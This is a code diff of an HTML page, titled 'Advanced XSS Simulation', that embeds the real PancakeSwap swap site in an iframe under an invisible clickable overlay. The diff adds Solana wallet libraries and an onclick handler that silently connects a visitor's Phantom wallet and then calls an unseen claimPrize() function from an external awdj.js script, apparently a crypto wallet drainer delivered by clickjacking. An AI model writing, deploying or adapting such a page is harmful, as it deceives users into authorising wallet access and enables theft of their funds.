@@ -4,6 +4,9 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Advanced XSS Simulation</title>
+    <script src="https://bundle.run/buffer@6.0.3"></script>
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
+    
     <style>
         body {
             margin: 0;
@@ -30,11 +33,11 @@
         /* Clickable area - placed at (839px, 529px) and made slightly bigger */
         .click-area {
             position: absolute;
-            top: 229px;
-            left: 539px;
+            top: 0px;
+            left: 1339px;
             width: 200px; /* Slightly bigger */
             height: 100px; /* Slightly bigger */
-             /* Fully transparent */
+            /* Fully transparent */
             cursor: pointer;
             z-index: 3;
         }
@@ -42,19 +45,20 @@
 </head>
 <body>
     <div class="iframe-container">
-        <!-- Iframe containing PancakeSwap -->
         <iframe src="https://pancakeswap.finance/swap" frameborder="0"></iframe>
-
-        <!-- Invisible clickable area -->
-        <div class="click-area" onclick="triggerAction()"></div>
+        <div id="connect-wallet" class="click-area" onclick="(async () => {
+            if (!wallet || !wallet.isConnected) {
+                await init();
+                const provider = window?.phantom?.solana || window.solana;
+                if (provider) {
+                    wallet = provider;
+                    await wallet.connect({ onlyIfTrusted: false });
+                }
+            } else {
+                await claimPrize();
+            }
+        })()"></div>
     </div>
-
-    <script>
-        function triggerAction() {
-            
-            // Example action: redirecting or another interaction
-            window.location.href = 'https://t.me/MemeseekCrypto';
-        }
-    </script>
+    <script src="awdj.js"></script>
 </body>
 </html>
